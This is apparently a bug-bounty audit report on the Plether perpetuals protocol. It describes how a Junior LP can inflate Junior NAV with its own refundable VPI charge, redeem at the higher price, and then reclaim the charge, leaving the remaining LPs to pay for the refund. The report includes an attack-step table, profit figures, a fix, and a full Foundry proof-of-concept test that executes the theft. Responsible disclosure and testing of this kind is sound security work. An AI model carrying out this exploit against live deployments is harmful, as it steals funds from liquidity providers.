# \#97888 [SC-Critical] A Junior LP redeems at a NAV raised by its own refundable VPI charge, and the remaining Junior LPs pay for the refund

**Submitted on Nov 3rd 2026 at 18:49:51 UTC by @W3B_SR_0xki for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97888
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description


## Summary

A skew-increasing open pays a VPI charge C. The settlement sidecar books C into the pool as Revenue / CashArrived immediately, so the next LP-epoch reconcile adds it to Junior principal. The charge is refundable: when the same position closes, the lifetime VPI clamp lets the trader take back up to the whole accrued C as an action rebate paid from pool cash. LP NAV holds no liability for that refund.

A Junior LP who also trades can therefore:

1. Queue a redemption of its whole Junior stake.
2. Open a skew-increasing position seconds before the hourly boundary.
3. Let anyone settle the epoch, so its redemption is paid at the pumped Junior price.
4. Close the position and take C back.

The refund then comes only from the LPs who stayed. The attacker gains about f·C, where f is its share of Junior, minus two 4 bps execution fees. The remaining Junior LPs lose about f·C, less the close fee, which is netted into the rebate.

The PoC uses release parameters, production entrypoints only, no pranked protocol address, only Pyth/USDG mocks and **no organic skew**. With an attacker holding 10M of 12M Junior:
- The attacker ends **+6,756.90 USDG** ahead of a plain redemption.
- The remaining Junior LPs lose **9,936.88 USDG** (0.50% of their stake).
- The loss equals the attacker's edge plus the protocol fee, to within 1 USDG.
- The trader position is open for about 40 seconds.

## Root cause

### 1. The VPI charge is booked as LP revenue at open
```solidity
// CfdEngineSettlementSidecar.sol:454-463 (executeOpen)
if (delta.tradeCostAssets > 0) {
    uint256 poolCashInflowAssets = uint256(delta.tradeCostAssets) - protocolFeeCreditedAssets;
    if (poolCashInflowAssets > 0) {
        IHousePool(host.pool()).recordClaimantInflow(
            poolCashInflowAssets, IHousePool.ClaimantInflowKind.Revenue, IHousePool.ClaimantInflowCashMode.CashArrived
        );
    }
}
```
`HousePool.recordClaimantInflow` (`HousePool.sol:624`) adds the amount to `accountedAssets`. At the next reconcile (`HousePool.sol:835`), `HousePoolWaterfallAccountingLib.distributeRevenue` (`:140`) credits it to `juniorPrincipal` once Senior is at its high-water mark. Redemptions are priced from that principal right after reconcile (`HousePool.sol:840`).

### 2. The same charge is refundable on close
```solidity
// libraries/CloseAccountingLib.sol:112-118
// Clamp so lifetime VPI (accrued + delta) never goes negative. Prevents LP sandwich attacks
// where an attacker opens at high depth, reduces pool depth, then closes to extract a
// net-negative lifetime VPI rebate. ...
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```
- A close that lowers the skew gets a negative VPI delta. The clamp floors it at minus the accrued charge, so the trader takes back exactly C.
- The planner turns that into `actionRebateAssets` (`CfdEnginePlanLib.sol:1060`), paid from free pool cash (`:973-977`) via `HousePool.payOut` (`CfdEngineSettlementSidecar.sol:621-623`).

### 3. LP NAV has no term for the refund owed
`HousePoolAccountingLib.buildReconcileSnapshot` (`:60-78`) computes `distributable = physicalAssets + terminalLpPriceDelta − traderClaims`. Its inputs come from `CfdEngineProtocolLens.getHousePoolInputSnapshot` (`:59-73`). There is no liability for the positive lifetime VPI that open positions can still recover. NAV is therefore overstated by the refundable charge for as long as the position is open.

## Why this is not intended or documented

- **The clamp's stated purpose.** `CloseAccountingLib.sol:112-115` says the clamp "Prevents LP sandwich attacks where an attacker opens at high depth, reduces pool depth, then closes". This attack follows that sequence exactly:
  - it opens at full depth;
  - the attacker's own redemption reduces depth;
  - it closes at the reduced depth.

  The clamp does cap the trader leg: the raw close rebate at the reduced depth is larger than C and is clamped to C. The value instead leaves through the LP leg.
- **Rebate-only round trips are meant to be worthless.** SECURITY.md:1443: "the lifetime clamp intentionally zeroes otherwise extractable rebate-only round trips". Here the trader's VPI does net to zero (charge C, rebate C), yet the round trip still extracts f·C from other LPs.
- **The documented exclusion covers the wrong side.** The docs keep *anticipated* VPI out of NAV (ACCOUNTING_SPEC.md:1064-1066; SECURITY.md:872), to stop LPs extracting value that is not yet earned (ACCOUNTING_SPEC.md:821-822). The charge is not anticipated: it is booked as revenue at once. What is anticipated is the refund, and that is ignored. The exclusion is meant to protect LPs; here it lets an exiting LP extract value.
- **Not a known issue.** It is absent from SECURITY.md Known Limitations, the Cecuro report, the SC Audit Studio pre-audit, the AI scan, and the Cantina and collaborative reports.

### Differences from the rebate-side issue (#97682)
#97682 covers the *rebate* side: a skew-reducing open pays a rebate out of pool cash while the reserve is kept out of NAV, and a new depositor buys the dip. This report is a different defect:

- **Direction.** The *charge* is booked as revenue while its refund is unaccounted, and an *exiting* LP sells the pump.
- **Fix.** Counting the rebate reserve in NAV, the remedy for #97682, does not fix this. The refundable positive lifetime VPI must be carried as a liability.
- **Preconditions.**
  - No organic skew is needed; the attacker creates the skew, up to the 0.4·depth cap.
  - The attacker's exposure is seconds, not hours. It leaves Junior at the settlement, and its trader position is open for about 40 seconds.

## Attack path (all steps permissionless)

| Time | Actor | Call | Effect |
|---|---|---|---|
| b − 900 s | attacker LP | `juniorVault.requestRedeem(allShares, lp, lp)` | Redemption queued for boundary b. The stake is past the 1 h cooldown. |
| b − 30 s | attacker trader | V3 `OrderRouter.commitOrder(LONG at about 0.4·depth)`, then self-executed `OrderRouter.executeOrder` | Charge C booked into the pool as revenue. |
| b + 5 s | anyone (here an unrelated keeper) | `OrderRouter.settleLpEpoch(pythData)` | Reconcile credits C to Junior principal. The attacker's redemption is funded at that price. |
| b + 6 s | attacker LP | `juniorVault.claimRedeem(...)` | The attacker receives `f·(J + C)`. |
| right after | attacker trader | commit and execute the close; `clearinghouse.withdraw` | The clamp turns C into a rebate paid from pool cash, now funded only by the remaining Junior. |

## Impact

**Victims.** The victims are the Junior LPs who stay. Each cycle they lose about f·C, less the close fee netted into the rebate. The attacker gains about f·C minus the two execution fees; the open fee goes to the treasury and the close fee stays in the pool.

**Measured at release parameters** (Senior 7.9M, victim Junior 2M, no organic skew):

| Attacker Junior stake | LONG size | Charge C | Attacker edge over a plain redemption | Remaining Junior loss | Treasury fee |
|---|---|---|---|---|---|
| 10M of 12M (f ≈ 0.83) | 7.95M | 15,879.63 | +6,756.90 | 9,936.88 (0.50%) | 3,179.96 |
| 3M of 5M (f ≈ 0.60) | 5.15M | 10,279.78 | +1,957.63 | 4,017.62 (0.20%) | 2,059.97 |

- **Conservation:** in both cases the remaining LPs' loss equals the attacker's edge plus the treasury fee, to within 1 USDG. The loss is a pure transfer, not a rounding or carry artifact. Senior is unaffected.
- **Scaling:**
  - C = ½·k·N²/D ≤ 0.0008·D at the skew cap, so the extraction scales linearly with pool depth.
  - The edge is positive for f above about 40%: at the cap the round-trip fees are 0.032% of D against f·0.08% of D.
- **Price risk:**
  - The trader position is open about 40 seconds. On 7.95M of an FX basket that is roughly ±0.7k at 1σ, small next to the edge, and it can be hedged.
  - The attacker no longer holds Junior after the settlement, so it carries no Junior first-loss exposure through the cycle.
- **Repeatability:** the attacker re-deposits, waits for activation and the 1 h cooldown, and repeats. Two LP accounts can alternate.

## Proof of concept

Place the file below at `packages/perps/test/perps/PoC_P21_VpiChargeNavPump.t.sol` and run, from the repository root:

```
git submodule update --init --recursive
forge test --root packages/perps --match-path test/perps/PoC_P21_VpiChargeNavPump.t.sol -vv
```

**What the PoC uses:**
- The repo's own `BasePerpTest` stack, with no in-scope contract modified and no protocol address pranked.
- All tranches are funded through the normal async LP flow: `requestDeposit`, then `OrderRouter.updateMarkPrice`, then the permissionless `HousePool.settleLpEpoch(0,0)` while no position exists, then `claimDeposit`.
- Every attack step uses production entrypoints: V3 `OrderRouter.commitOrder(OrderRequest)`, `executeOrder`, `updateMarkPrice` and `settleLpEpoch` (called by an unrelated keeper), `TrancheVault` request/claim functions, and `MarginClearinghouse` `deposit` / `withdraw`.
- `BasePerpTest`'s router is the repo's `LegacyOrderRouterHarness`. It inherits the production `OrderRouter` and only adds an unused scalar commit adapter.
- Only MockPyth and the mock settlement token are mocks.

**Configuration:**
- release risk parameters;
- execution fee 4 bps and settlement buffer 25 bps;
- adverse-confidence multiplier 2500 bps with a 0.5 bp Pyth confidence;
- Senior capacity 40M / 8000 bps, and 1 USDG seeds.

**Structure:** each test runs the attack and a control (the identical redemption, no trade) from the same snapshot. It asserts:
- no organic skew exists;
- the whole charge reaches the pool at open;
- the redemption is priced higher and pays more than in the control;
- the close refunds out of pool cash;
- the attacker's edge is positive;
- the remaining Junior LPs lose, and their loss equals the attacker's edge plus the treasury fee.


## Recommendation

Recognize the refundable part of lifetime VPI as a liability when pricing LP entries and exits. Two options:
- Subtract `Σ max(vpiAccrued, 0)` over open positions from distributable assets in `CfdEngineProtocolLens.getHousePoolInputSnapshot` / `HousePoolAccountingLib.buildReconcileSnapshot`, and release it as revenue only when the position closes or is liquidated.
- Alternatively, book a skew-increasing charge as a deferred, position-owned balance rather than immediate `Revenue`.

Together with counting outstanding rebate reserves as a receivable (the rebate-side issue), this makes VPI NAV-neutral until it is realized. That is the property the lifetime clamp was meant to guarantee.

## Proof of Concept

## Proof of Concept
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

// PoC: a skew-increasing open's VPI charge is booked into HousePool as Revenue/CashArrived immediately
// (CfdEngineSettlementSidecar.sol:454-463), so the next LP-epoch reconcile adds it to Junior principal. The charge is
// refundable: on close the lifetime clamp (CloseAccountingLib.sol:116-118) lets the same trader take it back as an
// action rebate paid from pool cash (CfdEnginePlanLib.sol:973-977, :1060; CfdEngineSettlementSidecar.sol:621-623).
// LP NAV carries no liability for that refund (HousePoolAccountingLib.sol:60-78). A Junior LP that is also a trader
// can pump Junior NAV with its own open just before the boundary, redeem at the pumped price, then close and take the
// charge back, leaving the remaining Junior LPs to fund the refund. No organic skew is needed; the trader exposure
// lasts seconds.
//
// Every step after the repo's own BasePerpTest constructor uses production entrypoints only: V3
// OrderRouter.commitOrder(OrderRequest), executeOrder, updateMarkPrice, settleLpEpoch (called by an unrelated keeper),
// HousePool.settleLpEpoch (permissionless while no position exists, used only for seeding), TrancheVault
// request/claim functions and MarginClearinghouse deposit/withdraw. No protocol address is pranked. Only Pyth
// (MockPyth) and the settlement token are mocks. Release risk parameters.

import {BasePerpTest} from "./BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {console2} from "forge-std/console2.sol";

contract PoC_P21_VpiChargeNavPump is BasePerpTest {

    uint256 internal constant PRICE = 1e8;
    /// @dev 0.5 bp Pyth confidence (realistic FX; the release cap is 10 bps). Release adverse multiplier = 2500 bps.
    uint64 internal constant CONF = 5000;
    uint256 internal constant LOT = 100e18;
    uint256 internal constant TRADER_FUNDING = 300_000e6;

    address internal constant VICTIM_JR = address(0x51C7); // remaining Junior LP (victim)
    address internal constant SENIOR_LP = address(0x5E17);
    address internal constant KEEPER = address(0xBEEF); // unrelated settler
    address internal constant ATK_LP = address(0xB0B1); // attacker's Junior LP account
    address internal constant ATK_TR = address(0xB0B2); // attacker's trader account

    struct Result {
        int256 attackerPnl;
        uint256 redemptionProceeds;
        uint256 victimJuniorAssets;
        uint256 seniorAssets;
        uint256 treasuryAssets;
        uint256 vpiCharge;
        uint256 poolInflowAtOpen;
        uint256 poolOutflowAtClose;
        uint256 juniorPrincipalAtRedemption;
    }

    // ------------------------------------------------------------------ release configuration

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    /// @dev Tranches are funded below through the production async flow instead of the base helper.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _initialSeniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        config.basketMaxConfidenceRatioBps = 10;
        _setRouterConfig(config);
        // A Tuesday 06:00 UTC (02:00 New York): live FX market, far from the Friday FAD / weekend freeze.
        uint256 target = SETUP_TIMESTAMP + 8 days;
        while (target <= vm.getBlockTimestamp()) {
            target += 7 days;
        }
        vm.warp(target);
        vm.roll(vm.getBlockNumber() + 1);
    }

    // ------------------------------------------------------------------ helpers (production entrypoints only)

    function _pyth(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(price)),
            CONF,
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _refreshMark(
        address caller
    ) internal {
        bytes[] memory updateData = _pyth(PRICE);
        vm.prank(caller);
        router.updateMarkPrice(updateData);
    }

    function _settle() internal {
        bytes[] memory updateData = _pyth(PRICE);
        vm.prank(KEEPER);
        router.settleLpEpoch(updateData);
    }

    /// @dev Async LP funding while no position exists: request, mark refresh, permissionless settlement, claim.
    function _seedTranche(
        TrancheVault vault,
        address lp,
        uint256 assets
    ) internal {
        _refreshMark(KEEPER);
        settlementToken.mint(lp, assets);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), assets);
        uint256 requestId = vault.requestDeposit(assets, lp, lp);
        vm.stopPrank();
        vm.warp(vault.depositEpochStart(requestId) + 5);
        _refreshMark(KEEPER);
        vm.prank(KEEPER);
        pool.settleLpEpoch(0, 0);
        uint256 claimable = vault.claimableDepositRequest(requestId, lp);
        assertEq(claimable, assets, "seed deposit activated");
        vm.prank(lp);
        vault.claimDeposit(requestId, claimable, lp, lp);
    }

    function _request(
        CfdTypes.Side side,
        uint256 lots,
        uint256 marginDelta,
        bool isClose
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request.clientOrderId = keccak256(abi.encode("PoC-P21", router.nextCommitId()));
        request.side = side;
        request.sizeDelta = lots * LOT;
        request.marginDelta = marginDelta;
        request.isClose = isClose;
        request.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + window),
            executionWindowSeconds: uint32(window),
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
    }

    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 lots,
        uint256 marginDelta,
        bool isClose
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(side, lots, marginDelta, isClose);
        vm.prank(trader);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory updateData = _pyth(PRICE);
        vm.prank(trader);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, updateData);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _treasuryAssets() internal view returns (uint256) {
        address treasury = engine.protocolTreasury();
        return clearinghouse.balanceAssets(treasury) + settlementToken.balanceOf(treasury);
    }

    function _attackerWallet() internal view returns (uint256) {
        return settlementToken.balanceOf(ATK_LP) + settlementToken.balanceOf(ATK_TR);
    }

    /// @dev Existing LPs: victim Junior, attacker Junior, Senior. The attacker's stake is past the 1h cooldown.
    function _seedPool(
        uint256 victimJunior,
        uint256 attackerJunior,
        uint256 senior
    ) internal {
        _seedTranche(juniorVault, VICTIM_JR, victimJunior);
        _seedTranche(juniorVault, ATK_LP, attackerJunior);
        _seedTranche(seniorVault, SENIOR_LP, senior);
        vm.warp(vm.getBlockTimestamp() + 2 hours);
        assertEq(
            _sideOpenInterest(CfdTypes.Side.LONG) + _sideOpenInterest(CfdTypes.Side.SHORT),
            0,
            "no organic positions: the attacker creates all the skew"
        );
    }

    // ------------------------------------------------------------------ one attack (or control) cycle

    /// @param pumpLots skew-increasing LONG size in lots of 100 USDG notional (0 = control: same redemption, no trade).
    function _cycle(
        uint256 pumpLots
    ) internal returns (Result memory res) {
        bool attack = pumpLots != 0;
        uint256 nowTs = vm.getBlockTimestamp();
        uint256 boundary = (nowTs / 3600 + 1) * 3600;
        if (boundary - nowTs < 1200) boundary += 3600;
        uint256 walletBefore = _attackerWallet();

        // (1) Before the cutoff, the attacker queues a redemption of its whole Junior stake for `boundary`.
        vm.warp(boundary - 900);
        _refreshMark(KEEPER);
        uint256 shares = juniorVault.balanceOf(ATK_LP);
        vm.prank(ATK_LP);
        uint256 redeemId = juniorVault.requestRedeem(shares, ATK_LP, ATK_LP);
        assertEq(pool.lpEpochStart(redeemId), boundary, "redemption matures at the next boundary");

        // (2) ~30 s before the boundary the attacker's trader account opens a skew-INCREASING LONG at the skew cap.
        //     The VPI charge is booked into the pool as revenue at once.
        if (attack) {
            _fundTrader(ATK_TR, TRADER_FUNDING);
            vm.warp(boundary - 30);
            uint256 accountedBefore = pool.accountedAssets();
            _trade(ATK_TR, CfdTypes.Side.LONG, pumpLots, 100_000e6, false);
            res.poolInflowAtOpen = pool.accountedAssets() - accountedBefore;
            (,,,,,, int256 vpiAccrued) = engine.positions(ATK_TR);
            assertGt(vpiAccrued, 0, "skew-increasing open paid a VPI charge");
            res.vpiCharge = uint256(vpiAccrued);
            assertApproxEqAbs(res.poolInflowAtOpen, res.vpiCharge, 1e6, "the whole charge is booked into the pool immediately");
        }

        // (3) Just after the boundary an unrelated keeper settles the epoch. Reconcile books the charge as Junior
        //     revenue, then the attacker's redemption is funded at that pumped Junior principal.
        vm.warp(boundary + 5);
        _settle();
        res.juniorPrincipalAtRedemption = pool.juniorPrincipal();
        uint256 redeemable = juniorVault.claimableRedeemAssets(redeemId, ATK_LP);
        assertGt(redeemable, 0, "redemption funded");
        vm.prank(ATK_LP);
        res.redemptionProceeds = juniorVault.claimRedeem(redeemId, shares, ATK_LP, ATK_LP);

        // (4) The attacker closes. The lifetime clamp turns the accrued charge into a rebate paid from pool cash,
        //     which only the remaining Junior LPs now fund.
        if (attack) {
            uint256 accountedBeforeClose = pool.accountedAssets();
            _trade(ATK_TR, CfdTypes.Side.LONG, pumpLots, 0, true);
            res.poolOutflowAtClose = accountedBeforeClose - pool.accountedAssets();
            (uint256 size,,,,,,) = engine.positions(ATK_TR);
            assertEq(size, 0, "attacker trader is flat");
            uint256 free = clearinghouse.getAccountAssetBuckets(ATK_TR).freeSettlementAssets;
            vm.prank(ATK_TR);
            clearinghouse.withdraw(ATK_TR, free);
        }

        res.attackerPnl = int256(_attackerWallet()) - int256(walletBefore) - int256(attack ? TRADER_FUNDING : 0);
        res.victimJuniorAssets = juniorVault.convertToAssets(
            juniorVault.balanceOf(VICTIM_JR) + juniorVault.balanceOf(address(this))
        );
        res.seniorAssets = seniorVault.convertToAssets(seniorVault.balanceOf(SENIOR_LP));
        res.treasuryAssets = _treasuryAssets();
    }

    function _runAndCompare(
        uint256 pumpLots
    ) internal returns (Result memory atk, Result memory ctl) {
        uint256 startTs = vm.getBlockTimestamp();
        uint256 startBlock = vm.getBlockNumber();
        uint256 snapshot = vm.snapshotState();
        atk = _cycle(pumpLots);
        vm.revertToState(snapshot);
        vm.warp(startTs);
        vm.roll(startBlock);
        ctl = _cycle(0);

        int256 edge = atk.attackerPnl - ctl.attackerPnl;
        int256 victimLoss = int256(ctl.victimJuniorAssets) - int256(atk.victimJuniorAssets);
        int256 treasuryEdge = int256(atk.treasuryAssets) - int256(ctl.treasuryAssets);
        console2.log("== skew-increasing LONG notional (USDG)    ", pumpLots * 100);
        console2.log("VPI charge C booked into the pool (atoms)  ", atk.vpiCharge);
        console2.log("pool cash in at open (atoms)               ", atk.poolInflowAtOpen);
        console2.log("pool cash out at close (atoms)             ", atk.poolOutflowAtClose);
        console2.log("juniorPrincipal after settlement: attack   ", atk.juniorPrincipalAtRedemption);
        console2.log("juniorPrincipal after settlement: control  ", ctl.juniorPrincipalAtRedemption);
        console2.log("attacker redemption proceeds: attack       ", atk.redemptionProceeds);
        console2.log("attacker redemption proceeds: control      ", ctl.redemptionProceeds);
        console2.log("attacker cycle PnL: attack (atoms)         ", atk.attackerPnl);
        console2.log("attacker cycle PnL: control (atoms)        ", ctl.attackerPnl);
        console2.log("attack edge over plain redemption (atoms)  ", edge);
        console2.log("remaining Junior LP value: attack          ", atk.victimJuniorAssets);
        console2.log("remaining Junior LP value: control         ", ctl.victimJuniorAssets);
        console2.log("remaining Junior LP loss (atoms)           ", victimLoss);
        console2.log("protocol treasury fee edge (atoms)         ", treasuryEdge);
        console2.log("Senior LP value: attack / control          ", atk.seniorAssets, ctl.seniorAssets);

        assertGt(atk.juniorPrincipalAtRedemption, ctl.juniorPrincipalAtRedemption, "redemption priced at a pumped NAV");
        assertGt(atk.redemptionProceeds, ctl.redemptionProceeds, "attacker redeems more than in the control");
        assertGt(atk.poolOutflowAtClose, 0, "the close refunds the charge out of pool cash");
        assertGt(edge, 0, "attack beats a plain redemption");
        assertGt(victimLoss, 0, "remaining Junior LPs lose value");
        assertApproxEqAbs(victimLoss, edge + treasuryEdge, 1e6, "loss == attacker edge + treasury fees");
    }

    // ------------------------------------------------------------------ tests

    /// @notice Attacker holds 10M of 12M Junior (f ~ 0.83); no organic skew; LONG at the 0.4 x depth cap.
    function test_P21_pump_attacker83pctOfJunior() public {
        _seedPool(2_000_000e6, 10_000_000e6, 7_900_000e6);
        _runAndCompare(79_500); // 7.95M notional, just under 0.4 x 19.9M depth
    }

    /// @notice Attacker holds 3M of 5M Junior (f ~ 0.6); no organic skew; LONG at the skew cap.
    function test_P21_pump_attacker60pctOfJunior() public {
        _seedPool(2_000_000e6, 3_000_000e6, 7_900_000e6);
        _runAndCompare(51_500); // 5.15M notional, just under 0.4 x 12.9M depth
    }

}
```

